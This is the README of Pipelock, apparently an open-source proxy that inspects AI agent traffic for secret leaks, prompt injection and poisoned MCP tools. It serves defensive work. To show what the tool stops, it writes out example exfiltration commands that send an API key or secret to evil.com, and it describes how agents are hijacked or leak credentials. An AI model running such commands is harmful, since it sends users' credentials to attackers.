<p align="center">
  <img src="assets/pipelock-logo.svg" alt="Pipelock" width="200">
</p>

# Pipelock

[![CI](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml)
[![Go Report Card](https://goreportcard.com/badge/github.com/luckyPipewrench/pipelock)](https://goreportcard.com/report/github.com/luckyPipewrench/pipelock)
[![GitHub Release](https://img.shields.io/github/v/release/luckyPipewrench/pipelock)](https://github.com/luckyPipewrench/pipelock/releases)
[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge)](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/11948/badge?level=silver)](https://www.bestpractices.dev/projects/11948)
[![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

**Open-source [agent firewall](https://pipelab.org/agent-firewall/) for AI agents.** Single binary, zero runtime dependencies.

Your agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
```

**Works with:** Claude Code · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph · Cursor

[Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/)

![Pipelock demo](assets/demo.gif)

## Quick Start

```bash
# macOS / Linux
brew install luckyPipewrench/tap/pipelock

# Or download a binary (no dependencies)
# See https://github.com/luckyPipewrench/pipelock/releases

# Or with Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest

# Or from source (requires Go 1.24+)
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
```

**Try it in 30 seconds:**

```bash
# 1. Generate a config
pipelock generate config --preset balanced > pipelock.yaml

# 2. This should be BLOCKED (DLP catches the fake API key)
pipelock check --config pipelock.yaml --url "https://example.com/?key=sk-ant-api03-fake1234567890"

# 3. This should be ALLOWED (clean URL, no secrets)
pipelock check --config pipelock.yaml --url "https://docs.python.org/3/"
```

<details>
<summary>Forward proxy mode (zero code changes, any HTTP client)</summary>

The forward proxy intercepts standard `HTTPS_PROXY` traffic. Enable it in your config, then point any process at pipelock:

```bash
# Edit pipelock.yaml: set forward_proxy.enabled to true
pipelock run --config pipelock.yaml

export HTTPS_PROXY=http://127.0.0.1:8888
export HTTP_PROXY=http://127.0.0.1:8888

# Now every HTTP request flows through pipelock's scanner.
curl "https://example.com/?key=sk-ant-api03-fake1234567890"  # blocked
```

No SDK, no wrapper, no code changes. If the agent speaks HTTP, pipelock scans it.

</details>

<details>
<summary>Fetch proxy mode (for agents with a dedicated fetch tool)</summary>

```bash
# Start the proxy (agents connect to localhost:8888/fetch?url=...)
pipelock run --config pipelock.yaml

# For full network isolation (agent can ONLY reach pipelock):
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

</details>

<details>
<summary>Verify release integrity (SLSA provenance + SBOM)</summary>

Every release includes SLSA build provenance and an SBOM (CycloneDX). Verify with the GitHub CLI:

```bash
# Verify a downloaded binary
gh attestation verify pipelock_*_linux_amd64.tar.gz --owner luckyPipewrench

# Verify the container image (substitute the release version)
gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner luckyPipewrench
```

</details>

## How It Works

Pipelock is an [agent firewall](https://pipelab.org/agent-firewall/): like a WAF for web apps, it sits inline between your AI agent and the internet. It uses **capability separation**: the agent process (which has secrets) is network-restricted, while Pipelock (which has NO secrets) inspects all traffic through a 9-layer scanner pipeline.

Three proxy modes, same port:

- **Fetch proxy** (`/fetch?url=...`): Pipelock fetches the URL, extracts text, scans the response for prompt injection, and returns clean content. Best for agents that use a dedicated fetch tool.
- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling and absolute-URI forwarding. Agents use Pipelock as their system proxy with zero code changes. Hostname scanning catches blocked domains and SSRF before the tunnel opens.
- **WebSocket proxy** (`/ws?url=ws://...`): Bidirectional frame scanning with DLP + injection detection on text frames. Fragment reassembly, message size limits, idle timeout, and connection lifetime controls are all built in.

```mermaid
flowchart LR
    subgraph PRIVILEGED["Privileged Zone"]
        Agent["AI Agent\n(has API keys)"]
    end
    subgraph FETCH["Firewall Zone"]
        Proxy["Pipelock\n(NO secrets)"]
        Scanner["Scanner Pipeline\nSSRF · Blocklist · Rate Limit\nDLP · Env Leak · Entropy · Length"]
    end
    subgraph NET["Internet"]
        Web["Web"]
    end

    Agent -- "fetch URL\nCONNECT\nor WebSocket" --> Proxy
    Proxy --> Scanner
    Scanner -- "content or\ntunnel" --> Agent
    Scanner -- "request" --> Web
    Web -- "response" --> Scanner
    Scanner -- "clean content" --> Agent

    style PRIVILEGED fill:#fee,stroke:#c33
    style FETCH fill:#efe,stroke:#3a3
    style NET fill:#eef,stroke:#33c
```

<details>
<summary>Text diagram (for terminals / non-mermaid renderers)</summary>

```
┌──────────────────────┐         ┌───────────────────────┐
│  PRIVILEGED ZONE     │         │  FIREWALL ZONE        │
│                      │         │                       │
│  AI Agent            │  IPC    │  Pipelock             │
│  - Has API keys      │────────>│  - NO secrets         │
│  - Has credentials   │ fetch / │  - Full internet      │
│  - Restricted network│ CONNECT │  - Returns text       │
│                      │ /ws     │  - WS frame scanning  │
│                      │<────────│  - URL scanning       │
│  Can reach:          │ content │  - Audit logging      │
│  ✓ api.anthropic.com │         │                       │
│  ✓ discord.com       │         │  Can reach:           │
│  ✗ evil.com          │         │  ✓ Any URL            │
│  ✗ pastebin.com      │         │  But has:             │
└──────────────────────┘         │  ✗ No env secrets     │
                                 │  ✗ No credentials     │
                                 └───────────────────────┘
```

</details>

## Why Pipelock?

| | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
|---|---|---|---|---|
| Secret exfiltration prevention | Yes | Partial (proxy mode) | Partial (domain-level) | Yes |
| DLP + entropy analysis | Yes | No | No | Partial |
| Prompt injection detection | Yes | Yes | No | No |
| Workspace integrity monitoring | Yes | No | No | Partial |
| MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
| WebSocket proxy (frame scanning + fragment reassembly) | Yes | No | No | No |
| MCP HTTP transport (Streamable HTTP + reverse proxy) | Yes | No | No | No |
| Emergency kill switch (config + signal + file + API) | Yes | No | No | No |
| Event emission (webhook + syslog) | Yes | No | No | No |
| Tool call chain detection | Yes | No | No | No |
| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel-level enforcement) |
| Audit logging + Prometheus | Yes | No | No | No |

Full comparison: [docs/comparison.md](docs/comparison.md)

## Security Matrix

Pipelock runs in three modes:

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Allowlist-only | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. Pipelock doesn't sandbox processes or restrict syscalls. It's a content inspection layer. For full defense in depth, pair it with an OS sandbox (see [docs/comparison.md](docs/comparison.md)).

## Features

### 9-Layer URL Scanner

Every request passes through: scheme validation, domain blocklist, DLP pattern matching (35 built-in patterns for API keys, tokens, credentials, and injection attempts), path entropy analysis, subdomain entropy analysis, SSRF protection with DNS rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets.

DLP runs before DNS resolution. Secrets are caught before any DNS query leaves the proxy. See [docs/bypass-resistance.md](docs/bypass-resistance.md) for the full evasion test matrix.

### Response Scanning

Fetched content is scanned for prompt injection before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).

### MCP Proxy

Wraps any MCP server with bidirectional scanning. Three transport modes: stdio subprocess wrapping, Streamable HTTP bridging, and HTTP reverse proxy. Scans both directions: client requests checked for DLP leaks, server responses scanned for injection, and `tools/list` responses checked for poisoned descriptions and mid-session rug-pull changes.

```bash
# Wrap a local MCP server (stdio)
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# Proxy a remote MCP server (HTTP)
pipelock mcp proxy --upstream http://localhost:8080/mcp

# Combined mode (fetch/forward proxy + MCP on separate ports)
pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp
```

### MCP Tool Policy

Pre-execution rules that block dangerous tool calls before they reach MCP servers. Ships with 9 built-in rules covering destructive operations, credential access, reverse shells, and encoded command execution. Shell obfuscation detection is built-in.

### Tool Call Chain Detection

Detects attack patterns in sequences of MCP tool calls. Ships with 8 built-in patterns covering reconnaissance, credential theft, data staging, and exfiltration chains. Uses subsequence matching with configurable gap tolerance, so inserting innocent calls between attack steps doesn't evade detection.

### Kill Switch

Emergency deny-all with four independent activation sources: config file, SIGUSR1, sentinel file, and remote API. Any one active blocks all traffic. The API can run on a separate port so agents can't deactivate their own kill switch.

```bash
# Activate from operator machine
curl -X POST http://localhost:9090/api/v1/killswitch \
  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
```

### Event Emission

Forward audit events to external systems (SIEM, webhook receivers, syslog). Events are fire-and-forget and never block the proxy. Each event includes a MITRE ATT&CK technique ID where applicable (T1048 for exfiltration, T1059 for injection, T1195.002 for supply chain).

See [docs/guides/siem-integration.md](docs/guides/siem-integration.md) for log schema, forwarding patterns, and example SIEM queries.

### More Features

| Feature | What It Does |
|---------|-------------|
| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files |
| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before they're committed |
| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |
| **Session Profiling** | Per-session behavioral analysis (domain bursts, volume spikes) |
| **Adaptive Enforcement** | Threat score accumulation with automatic escalation |
| **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
| **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
| **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |

![Pipelock Fleet Monitor — Grafana dashboard showing traffic, security events, and WebSocket metrics](docs/assets/fleet-dashboard.jpg)

## Configuration

Generate a starter config, or use one of the 6 presets:

```bash
pipelock generate config --preset balanced > pipelock.yaml
pipelock audit ./my-project -o pipelock.yaml  # tailored to your project
```

| Preset | Mode | Action | Best For |
|--------|------|--------|----------|
| `configs/balanced.yaml` | balanced | warn | General purpose |
| `configs/strict.yaml` | strict | block | High-security |
| `configs/audit.yaml` | audit | warn | Log-only monitoring |
| `configs/claude-code.yaml` | balanced | block | Claude Code (unattended) |
| `configs/cursor.yaml` | balanced | block | Cursor IDE |
| `configs/generic-agent.yaml` | balanced | warn | New agents (tuning) |

Config changes are picked up automatically via file watcher or SIGHUP (most fields hot-reload without restart).

Full reference with all fields, defaults, and hot-reload behavior: **[docs/configuration.md](docs/configuration.md)**

## Integration Guides

- **[Claude Code](docs/guides/claude-code.md):** MCP proxy setup, `.claude.json` configuration
- **[OpenAI Agents SDK](docs/guides/openai-agents.md):** `MCPServerStdio`, multi-agent handoffs
- **[Google ADK](docs/guides/google-adk.md):** `McpToolset`, `StdioConnectionParams`
- **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
- **[CrewAI](docs/guides/crewai.md):** `MCPServerStdio` wrapping, `MCPServerAdapter`
- **[LangGraph](docs/guides/langgraph.md):** `MultiServerMCPClient`, `StateGraph`
- **Cursor:** use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)

## CI Integration

### GitHub Action

Scan your project for agent security risks on every PR. No Go toolchain needed.

```yaml
# .github/workflows/pipelock.yaml
- uses: luckyPipewrench/pipelock@v0.3.1
  with:
    scan-diff: 'true'
    fail-on-findings: 'true'
```

The action downloads a pre-built binary, runs `pipelock audit` on your project, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. Critical findings produce inline annotations on the PR diff.

See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow.

### Reusable Workflow

For even simpler adoption, call the reusable workflow directly:

```yaml
# .github/workflows/security.yaml
jobs:
  pipelock:
    uses: luckyPipewrench/pipelock/.github/workflows/reusable-scan.yml@v1
    with:
      fail-on-critical: true
```

That's the entire workflow. Everything else is defaults: auto-generated config, PR diff scanning, artifact upload.

## Deployment

```bash
# Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
  ghcr.io/luckypipewrench/pipelock:latest \
  run --config /config/pipelock.yaml --listen 0.0.0.0:8888

# Network-isolated agent (Docker Compose)
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

For production deployment recipes (Docker Compose with network isolation, Kubernetes sidecar + NetworkPolicy, iptables/nftables, macOS PF): **[docs/guides/deployment-recipes.md](docs/guides/deployment-recipes.md)**

<details>
<summary>API Reference</summary>

```bash
# Fetch a URL (returns extracted text content)
curl "http://localhost:8888/fetch?url=https://example.com"

# Forward proxy (when forward_proxy.enabled: true)
# Set HTTPS_PROXY=http://localhost:8888 and use any HTTP client normally.
curl -x http://localhost:8888 https://example.com

# WebSocket proxy (when websocket_proxy.enabled: true)
# wscat -c "ws://localhost:8888/ws?url=ws://upstream:9090/path"

# Health check
curl "http://localhost:8888/health"

# Prometheus metrics
curl "http://localhost:8888/metrics"

# JSON stats (top blocked domains, scanner hits, tunnels, block rate)
curl "http://localhost:8888/stats"

# Kill switch API (when api_listen is set, use that port instead)
curl -X POST http://localhost:9090/api/v1/killswitch \
  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
curl http://localhost:9090/api/v1/killswitch/status \
  -H "Authorization: Bearer TOKEN"
```

**Fetch response:**
```json
{
  "url": "https://example.com",
  "agent": "my-bot",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "This domain is for use in illustrative examples...",
  "blocked": false
}
```

**Health response:**
```json
{
  "status": "healthy",
  "version": "x.y.z",
  "mode": "balanced",
  "uptime_seconds": 3600.5,
  "dlp_patterns": 35,
  "response_scan_enabled": true,
  "kill_switch_active": false
}
```

</details>

<details>
<summary>OWASP Agentic Top 10 Coverage</summary>

| Threat | Coverage |
|--------|----------|
| ASI01 Agent Goal Hijack | **Strong:** bidirectional MCP + response scanning |
| ASI02 Tool Misuse | **Partial:** proxy as controlled tool, MCP scanning |
| ASI03 Identity & Privilege Abuse | **Strong:** capability separation + SSRF protection |
| ASI04 Supply Chain Vulnerabilities | **Partial:** integrity monitoring + MCP scanning |
| ASI05 Unexpected Code Execution | **Moderate:** HITL approval, fail-closed defaults |
| ASI06 Memory & Context Poisoning | **Moderate:** injection detection on fetched content |
| ASI07 Insecure Inter-Agent Communication | **Partial:** agent ID, integrity, signing |
| ASI08 Cascading Failures | **Moderate:** fail-closed architecture, rate limiting |
| ASI09 Human-Agent Trust Exploitation | **Partial:** HITL modes, audit logging |
| ASI10 Rogue Agents | **Strong:** domain allowlist + rate limiting + capability separation |

Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)

</details>

## Docs

| Document | What's In It |
|----------|-------------|
| [Configuration Reference](docs/configuration.md) | All config fields, defaults, hot-reload behavior, presets |
| [Deployment Recipes](docs/guides/deployment-recipes.md) | Docker Compose, K8s sidecar + NetworkPolicy, iptables, macOS PF |
| [Bypass Resistance](docs/bypass-resistance.md) | Known evasion techniques, mitigations, and honest limitations |
| [Known Attacks Blocked](docs/attacks-blocked.md) | Real attacks with repro snippets and pipelock config that stops them |
| [Policy Spec v0.1](docs/policy-spec-v0.1.md) | Portable agent firewall policy format |
| [SIEM Integration](docs/guides/siem-integration.md) | Log schema, forwarding patterns, KQL/SPL/EQL queries |
| [Metrics Reference](docs/metrics.md) | All 20 Prometheus metrics, alert rule templates |
| [OWASP Mapping](docs/owasp-mapping.md) | Coverage against OWASP Agentic AI Top 10 |
| [Comparison](docs/comparison.md) | How pipelock compares to agent-scan, srt, agentsh, MCP Gateway |
| [Finding Suppression](docs/guides/suppression.md) | Rule names, path matching, inline comments, CI integration |
| [Security Assurance](docs/security-assurance.md) | Security model, trust boundaries, supply chain |
| [EU AI Act Mapping](docs/compliance/eu-ai-act-mapping.md) | Article-by-article compliance mapping |

## Project Structure

```text
cmd/pipelock/          CLI entry point
internal/
  cli/                 20+ Cobra commands (run, check, generate, mcp, integrity, ...)
  config/              YAML config, validation, defaults, hot-reload (fsnotify)
  scanner/             9-layer URL scanning pipeline + response injection detection
  audit/               Structured JSON logging (zerolog) + event emission dispatch
  proxy/               HTTP proxy: fetch, forward (CONNECT), WebSocket, DNS pinning
  mcp/                 MCP proxy + bidirectional scanning + tool poisoning + chains
  killswitch/          Emergency deny-all (4 sources) + port-isolated API
  emit/                Event emission (webhook + syslog sinks)
  metrics/             Prometheus metrics + JSON stats
  normalize/           Unicode normalization (NFKC, confusables, combining marks)
  integrity/           SHA256 file integrity monitoring
  signing/             Ed25519 key management
  gitprotect/          Git diff scanning for secrets
  hitl/                Human-in-the-loop terminal approval
configs/               6 preset config files
docs/                  Guides, references, compliance mappings
```

## Testing

Canonical metrics, updated each release.

| Metric | Value |
|--------|-------|
| Go tests (with `-race`) | 3,900+ |
| Statement coverage | 95%+ |
| Evasion techniques tested | 230+ |
| Scanner pipeline overhead | ~25us per URL scan |
| CI matrix | Go 1.24 + 1.25, CodeQL, golangci-lint |
| Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |
| OpenSSF Scorecard | [Live score](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock) |

Run `make test` to verify locally. Full benchmark details: [docs/benchmarks.md](docs/benchmarks.md).

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to other tools in this space
- Security review contributions from Dylan Corrales

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock). It helps others find the project.

## License

Apache License 2.0. Copyright 2026 Joshua Waldrep.

See [LICENSE](LICENSE) for the full text.
